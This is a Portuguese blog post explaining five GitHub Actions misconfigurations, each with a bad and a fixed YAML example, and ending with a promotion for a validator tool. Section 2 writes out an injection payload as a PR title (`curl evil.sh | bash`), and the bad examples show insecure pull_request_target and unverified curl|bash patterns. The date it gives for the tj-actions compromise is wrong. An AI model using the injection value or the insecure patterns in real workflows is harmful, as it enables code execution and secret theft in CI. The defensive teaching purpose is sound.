---
title: "Os erros de segurança no GitHub Actions que os linters não detectam"
description: "Validadores de YAML detectam sintaxe, não exposição. Aqui estão as cinco configurações incorretas de alto impacto do GitHub Actions — pull_request_target, injeção de script, actions sem pin, escopos amplos do GITHUB_TOKEN e curl|bash — com o padrão ruim e a correção para cada uma."
pubDate: 2026-05-06
tags: ["github-actions", "security", "ci-cd"]
lang: pt-br
translationOf: "github-actions-security-misconfigurations"
---

Um linter de YAML vai te avisar quando o seu workflow não puder ser interpretado. Ele não vai te avisar quando o seu workflow entrega um token de escrita ao pull request de um fork, ou executa um nome de branch controlado por um atacante como código de shell. Esses bugs são sintaticamente perfeitos — passam por toda verificação de schema, rodam verdes na primeira tentativa e ampliam silenciosamente a sua superfície de ataque até alguém perceber.

O GitHub Actions é especialmente exposto porque workflows são código que roda a cada push, frequentemente com secrets em escopo e um token que pode escrever no repositório. Os erros abaixo são os que transformam um pipeline de CI rotineiro em um incidente de cadeia de suprimentos. Nenhum deles é detectado apenas pela verificação de sintaxe do `actionlint`, e todos os cinco são comuns o bastante para aparecerem em repositórios públicos reais toda semana.

## 1. `pull_request_target` fazendo checkout de código não confiável

O gatilho `pull_request_target` roda com **os secrets do repositório base e um token de leitura/escrita**, mas faz checkout da branch *alvo* por padrão — o que é justamente o que o torna útil para rotular PRs ou postar comentários a partir de forks. A armadilha é fazer checkout do head do PR e então *executá-lo*. Isso executa código controlado por um atacante com os seus secrets em escopo.

```yaml
# BAD — runs fork code with repo secrets and a write token
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # untrusted!
      - run: npm install && npm run build              # arbitrary code
```

Um atacante abre um PR cujo `npm install` executa um script `postinstall` malicioso, e esse script pode ler `secrets.*` ou exfiltrar o `GITHUB_TOKEN`. Se você só precisa *inspecionar* um PR, use `pull_request` (sem secrets, token somente leitura). Se você realmente precisa de secrets — por exemplo, para postar um status — divida o trabalho: faça o build do código não confiável em um job `pull_request` sem secrets, e então aja sobre a saída dele em um workflow separado e confiável.

```yaml
# FIXED — untrusted code runs without secrets
on: pull_request          # forked PRs get a read-only token, no secrets
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # checks out PR head safely, unprivileged
      - run: npm ci && npm run build
```

Por que isso importa: este é o padrão de Actions mais explorado de todos. Tratar PRs de forks como entrada não confiável é o cerne de tudo.

## 2. Injeção de script através de `${{ github.event.* }}`

Qualquer coisa que um usuário possa digitar — um título de PR, um nome de branch, o corpo de uma issue, uma mensagem de commit — é controlada por um atacante. Quando você a interpola diretamente em um bloco `run:`, o GitHub substitui a string bruta no shell *antes* de o shell rodar, então um valor cuidadosamente construído se torna código executável.

```yaml
# BAD — PR title is spliced straight into the shell
- name: Greet
  run: echo "Building PR: ${{ github.event.pull_request.title }}"
```

Um PR com o título `"; curl evil.sh | bash #` transforma aquele único `echo` em dois comandos. A correção é passar o valor não confiável através de uma variável de ambiente. Variáveis definidas em `env:` não são interpoladas pelo runner — o shell as recebe como dados, e colocá-las entre aspas as mantém inertes.

```yaml
# FIXED — value arrives as data, never as code
- name: Greet
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building PR: $PR_TITLE"
```

Por que isso importa: é a escalada de privilégios mais fácil em CI e não precisa de nenhum gatilho especial — qualquer workflow que dê echo em texto fornecido pelo usuário é um candidato. A indireção via `env:` custa duas linhas e fecha completamente a brecha.

## 3. Actions de terceiros fixadas em uma tag

`uses: some/action@v3` resolve para uma tag mutável. O dono — ou qualquer um que comprometa essa conta — pode mover `v3` para apontar para um novo código, e a sua próxima execução o puxa sem que você mude nada. Tags são apelidos de conveniência, não garantias de integridade.

```yaml
# BAD — mutable reference, can change under you
- uses: tj-actions/changed-files@v44
```

Fixe actions de terceiros em um **SHA de commit completo de 40 caracteres**. Um SHA é imutável: a única maneira de mudar o que roda é você incrementá-lo deliberadamente, que é exatamente o ponto de revisão que você quer. Mantenha a versão legível por humanos em um comentário ao final para que as atualizações continuem legíveis, e deixe o Dependabot incrementar os pins por você.

```yaml
# FIXED — immutable, auditable pin
- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8 # v44.5.7
```

Por que isso importa: o comprometimento do `tj-actions/changed-files` em março de 2024 — em que um commit malicioso foi enviado por trás de tags existentes e despejou secrets de milhares de repositórios — afetou apenas workflows fixados em tags. Os consumidores fixados em SHA ficaram intocados.

## 4. Permissões excessivamente amplas do `GITHUB_TOKEN`

Se você nunca declara `permissions:`, o `GITHUB_TOKEN` automático pode adotar como padrão amplo acesso de leitura/escrita em todo o repositório, dependendo das configurações da organização e do repositório. Isso significa que um passo comprometido — digamos, uma dependência maliciosa — pode enviar commits, editar releases ou abrir pull requests usando o seu próprio token.

```yaml
# BAD — no permissions block, token inherits broad defaults
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

Defina um **padrão somente leitura no topo do workflow** e então conceda escopos de escrita apenas aos jobs específicos que precisam deles. A maioria dos jobs de CI não precisa de mais do que `contents: read`. Um job que publica uma release ou posta um comentário recebe exatamente aquele único escopo e nada mais.

```yaml
# FIXED — least privilege, scoped per job
on: push
permissions:
  contents: read            # workflow-wide default
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
  release:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: write       # only this job can write
    steps:
      - uses: actions/checkout@v4
      - run: ./scripts/publish.sh
```

Por que isso importa: o privilégio mínimo transforma "um passo comprometido é dono do repositório" em "um passo comprometido pode ler código que ele já podia ver". É a redução de raio de impacto mais barata que você pode fazer.

## 5. `curl | bash` dentro de um passo

Encaminhar um script remoto direto para um shell executa o que quer que aquela URL sirva *no momento da execução*, sem pin, sem checksum e sem revisão. Se o host for comprometido, ou o DNS for sequestrado, ou o mantenedor simplesmente publicar uma versão ruim, ele é executado no seu runner com o seu token em escopo.

```yaml
# BAD — runs whatever the URL serves, unverified
- run: curl -sSL https://example.com/install.sh | bash
```

Fixe o instalador em uma versão conhecida e verifique o checksum dele antes de executar — ou, melhor ainda, use uma setup action verificada e fixada em SHA que já faça isso. O objetivo é tornar "qual código rodou" um fato que você pode reconstruir depois.

```yaml
# FIXED — download, verify, then run
- run: |
    curl -fsSL -o install.sh https://example.com/v1.2.3/install.sh
    echo "9b74c9897bac770ffc029102a200c5de  install.sh" | md5sum -c -
    bash install.sh
```

Por que isso importa: `curl | bash` é uma dependência não assinada e sem versão que você refaz o download a cada execução. Fixar e verificar transforma uma confiança cega em uma auditável.

## Detecte estes antes que sejam mesclados

Cada um destes passa por uma verificação de schema YAML, e é por isso que um linter de sintaxe passa direto por eles. São problemas de alcançabilidade e confiança, não problemas de parse — e são exatamente o que a revisão deveria detectar, mas raramente detecta em uma olhada rápida.

O **GitHub Actions Validator** verifica todos os cinco, do lado do cliente, no momento em que você cola um workflow: ele sinaliza checkouts de refs não confiáveis no `pull_request_target`, interpolação de `${{ }}` em passos `run:`, actions de terceiros sem pin, `permissions:` ausentes ou excessivamente amplas e invocações de `curl | bash` — junto com os erros comuns de YAML. Nada é enviado; o seu workflow nunca sai do navegador.

Se você já lançou um workflow e torceu para que fosse seguro, este é o passo que garante isso.

[Experimente o GitHub Actions Validator →](/github-actions-validator)
